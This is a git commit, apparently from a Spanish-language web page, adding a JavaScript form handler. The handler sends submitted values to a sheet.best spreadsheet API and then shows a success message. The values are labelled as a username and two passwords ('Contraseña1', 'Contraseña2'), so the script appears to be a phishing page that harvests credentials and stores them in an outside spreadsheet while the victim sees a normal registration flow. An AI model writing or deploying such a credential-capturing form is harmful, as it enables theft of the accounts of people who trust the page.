dd66f25d53d36ee02780ccbd535cab0cdd393324
dav <daco200471@gmail.com>
2023-01-20 02:30:18 -0600

    Inicio de Pagina

---
+++ js/app.js
@@ -0,0 +1,31 @@
+﻿const formulario = document.getElementById('formulario');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/929c4ddd-92b1-4848-b8bb-d0d782f71287', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.nombre.value,
+            "Contraseña1": formulario.correo.value,
+            "Contraseña2": formulario.telefono.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
